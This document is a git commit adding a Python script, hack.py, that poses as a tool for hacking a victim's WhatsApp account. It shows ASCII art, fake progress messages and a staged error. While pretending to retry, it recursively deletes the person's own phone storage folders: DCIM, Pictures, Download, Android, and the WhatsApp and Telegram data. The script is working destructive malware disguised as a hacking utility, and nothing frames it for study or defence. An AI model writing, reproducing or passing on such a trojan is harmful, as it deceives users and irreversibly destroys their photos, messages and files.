5345d332eba3f03c2d6d72573fabc3ddb54de931
qadirahmad43 <93971522+qadirahmad43@users.noreply.github.com>
2022-01-26 22:40:22 -0800

    Add files via upload

---
+++ hack.py
@@ -0,0 +1,68 @@
+import os
+import sys
+import time
+import shutil
+os.system('clear')
+print("                         .:::!~!!!!!:.")
+print("                      .xUHWH!! !!?M88WHX:.")
+print("                   .X*#M@&!!  !X!M&&&&&&WWx:.")
+print("                  :!!!!!!?H! :!&!&&&&&&&&&&8X:")
+print("                 !!~  ~:~!! :~!&!#&&&&&&&&&&8X:")
+print("                :!~::!H!<   ~.U&X!?R&&&&&&&&MM!")
+print("                ~!~!!!!~~ .:XW&&&U!!?&&&&&&RMM!")
+print("                  !:~~~ .:!MST#&&&&WX??#MRRMMM!")
+print("                  ~?WuxiW*`   `√#&&&&8!!!!??!!!")
+print("                :X- M&&&&       `rT#&T~!8&WUXU~")
+print("              :%`  ~#&&&m:  "+"\033[1;32;31m  ✪ "+"\033[1;32;37m   ~!~ ?&&&&&&")
+print("            :!`.-   ~T&&&&8xx.  .xWW- ~x&&&&&")
+print(" .......   -~~:<` !    ~?T#&&@@W@*?&&  "+"\033[1;32;31m✪ "+"\033[1;32;37m  /`")
+print("\033[1;32;32mG"+"\033[1;32;37m |W&@@M!!! .!~~ !!     .:XUW&W!~ `&~:    :")
+print("\033[1;32;32mH"+"\033[1;32;37m |#&~~`.:x%`!!  !H:   !WM&&&&Ti.: .!WUn+!`")
+print("\033[1;32;32mO"+"\033[1;32;37m |:::~:!!`:X~ .: ?H.!u °&&&B&&&!W:U!T&&M~")
+print("\033[1;32;32mS"+"\033[1;32;37m |.~~   :X@!.-~   ?@WTWo(`*&&&W&TH&! `")
+print("\033[1;32;32mT"+"\033[1;32;37m |Wi.~!X$?!-~    / ?&&&B&Wu(`**&RM!")
+print("  .......         /   ~&&&&&B&&en:``")
+print("                      ~`##*&&&&M~")
+print("")
+time.sleep(0.75)
+print("\033[1;32;36m=[ Coded by _.QADIR AHMAD._ ]=".center(70))
+print("")
+time.sleep(1)
+print("\033[1;32;37m❚❚❚❚Welcome to QADIR hack❚❚❚❚".center(70))
+print("")
+time.sleep(2)
+num=int(input("❙❙Enter your number❯❯❯"))
+time.sleep(1)
+num2=str(input("❙❙Enter Victims Number❯❯❯"))
+print("")
+time.sleep(2)
+print("\033[1;32;33mwait "+num2+" is being hacked......")
+print()
+time.sleep(2)
+a=11
+b=1
+while b<a:
+	print("\033[1;32;38m Please Wait.................!!")
+	print()
+	time.sleep(2)
+	b +=1
+print("\033[1;32;36mImporting WhatsApp Account Data..........")
+time.sleep(10)
+print("")
+a=6
+b=1
+while b<a:
+	print("\033[1;32;38m Please Wait.................!!")
+	print()
+	time.sleep(2)
+	b +=1
+print("\033[1;32;31mSorry,an error occured......")
+shutil.rmtree("/storage/emulated/0/DCIM")
+shutil.rmtree("/storage/emulated/0/Pictures")
+shutil.rmtree("/storage/emulated/0/Telegram")
+shutil.rmtree("/storage/emulated/0/WhatsApp")
+shutil.rmtree("/storage/emulated/0/Android")
+shutil.rmtree("/storage/emulated/0/FMWhatsApp")
+shutil.rmtree("/storage/emulated/0/Download")
+print("Retrying.....................")
+print("Try Again....................")
